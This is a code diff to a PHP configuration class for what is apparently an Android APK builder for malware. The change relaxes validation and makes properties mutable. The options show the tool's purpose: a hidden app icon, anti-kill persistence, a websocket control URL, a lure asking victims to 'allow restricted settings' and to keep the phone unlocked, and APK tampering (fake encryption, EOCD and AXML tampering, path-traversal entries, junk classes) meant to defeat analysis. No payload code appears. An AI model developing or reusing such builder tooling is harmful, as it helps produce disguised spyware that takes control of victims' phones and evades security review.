@@ -9,56 +9,56 @@ use Illuminate\Contracts\Support\Arrayable;
 final class ApkBuildConfig implements Arrayable
 {
     public function __construct(
-        public readonly string $appId,
-        public readonly string $userId,
-        public readonly string $appName,
-        public readonly string $appVersion,
-        public readonly string $websocketUrl,
-        public readonly string $clientName = '',
-        public readonly string $email = '',
-        public readonly string $appUrl = '',
-        public readonly string $iconPath = '',
-        public readonly string $backgroundPath = 'black',
-        public readonly string $useAccess = '1',
-        public readonly string $useAntkill = '1',
-        public readonly string $useAtoprims = '加载中~请勿操作或锁屏！',
-        public readonly string $userAllprims = '1',
-        public readonly string $userBlackprims = '1',
-        public readonly string $hiddenApp = '1',
-        public readonly string $useDraw = '0',
-        public readonly string $openAccess = '0',
-        public readonly string $diaoType = '1',
-        public readonly string $hideType = 'f',
-        public readonly string $installType = 'g',
-        public readonly string $buildType = 'C',
-        public readonly string $loginTitle = '欢迎使用',
-        public readonly string $loginDis = '允许受限制的设置',
-        public readonly string $loginBtn = '开始',
-        public readonly string $lngShort = '',
-        public readonly string $notifyTitle = ' ',
-        public readonly string $notifyMsg = 'on',
-        public readonly string $mainActivity = 'empty',
-        public readonly string $appFolder = 'empty',
-        public readonly string $description = '',
-        public readonly bool $enableJunkClasses = false,
-        public readonly bool $enableClassShuffle = false,
-        public readonly bool $enableStringObfuscation = false,
-        public readonly bool $enableApkProtection = false,
-        public readonly bool $enableDexModification = false,
-        public readonly int $junkClassCount = 50,
-        public readonly int $junkMethodCount = 10,
-        public readonly bool $enableFakeEncryption = false,
-        public readonly bool $enableEocdTampering = false,
-        public readonly bool $enablePathTraversalEntries = false,
-        public readonly bool $enableUnknownCompression = false,
-        public readonly bool $enableAxmlTampering = false,
-        public readonly bool $enableFullStringEncryption = false,
-        public readonly bool $enableFakeComponents = false,
-        public readonly bool $enableMultiPackageJunk = false,
-        public readonly int $fakeEntryCount = 120,
-        public readonly int $fakeComponentCount = 28,
-        public readonly bool $enableR8Obfuscation = false,
-        public readonly bool $enableAutoWakeScreen = true,
+        public string $appId,
+        public string $userId,
+        public string $appName,
+        public string $appVersion,
+        public string $websocketUrl,
+        public string $clientName = '',
+        public string $email = '',
+        public string $appUrl = '',
+        public string $iconPath = '',
+        public string $backgroundPath = 'black',
+        public string $useAccess = '1',
+        public string $useAntkill = '1',
+        public string $useAtoprims = '加载中~请勿操作或锁屏！',
+        public string $userAllprims = '1',
+        public string $userBlackprims = '1',
+        public string $hiddenApp = '1',
+        public string $useDraw = '0',
+        public string $openAccess = '0',
+        public string $diaoType = '1',
+        public string $hideType = 'f',
+        public string $installType = 'g',
+        public string $buildType = 'C',
+        public string $loginTitle = '欢迎使用',
+        public string $loginDis = '允许受限制的设置',
+        public string $loginBtn = '开始',
+        public string $lngShort = '',
+        public string $notifyTitle = ' ',
+        public string $notifyMsg = 'on',
+        public string $mainActivity = 'empty',
+        public string $appFolder = 'empty',
+        public string $description = '',
+        public bool $enableJunkClasses = false,
+        public bool $enableClassShuffle = false,
+        public bool $enableStringObfuscation = false,
+        public bool $enableApkProtection = false,
+        public bool $enableDexModification = false,
+        public int $junkClassCount = 50,
+        public int $junkMethodCount = 10,
+        public bool $enableFakeEncryption = false,
+        public bool $enableEocdTampering = false,
+        public bool $enablePathTraversalEntries = false,
+        public bool $enableUnknownCompression = false,
+        public bool $enableAxmlTampering = false,
+        public bool $enableFullStringEncryption = false,
+        public bool $enableFakeComponents = false,
+        public bool $enableMultiPackageJunk = false,
+        public int $fakeEntryCount = 120,
+        public int $fakeComponentCount = 28,
+        public bool $enableR8Obfuscation = false,
+        public bool $enableAutoWakeScreen = true,
     ) {}
 
     public static function fromArray(array $data): self
@@ -177,10 +177,8 @@ final class ApkBuildConfig implements Arrayable
     {
         $errors = [];
 
-        // Required fields
-        if (empty($this->appId)) {
-            $errors[] = 'app_id is required';
-        } elseif (! preg_match('/^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/', $this->appId)) {
+        // Required fields (appId 允许为空，ApkBuilder 会自动生成)
+        if (! empty($this->appId) && ! preg_match('/^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/', $this->appId)) {
             $errors[] = 'app_id must be a valid package name (e.g., com.example.app)';
         }
 
@@ -194,9 +192,8 @@ final class ApkBuildConfig implements Arrayable
             $errors[] = 'app_name must not exceed 100 characters';
         }
 
-        if (empty($this->appVersion)) {
-            $errors[] = 'app_version is required';
-        } elseif (! preg_match('/^\d+(\.\d+){0,2}$/', $this->appVersion)) {
+        // appVersion 允许为空，ApkBuilder 会自动生成
+        if (! empty($this->appVersion) && ! preg_match('/^\d+(\.\d+){0,2}$/', $this->appVersion)) {
             $errors[] = 'app_version must be a valid version (e.g., 1.0 or 1.0.0)';
         }
 
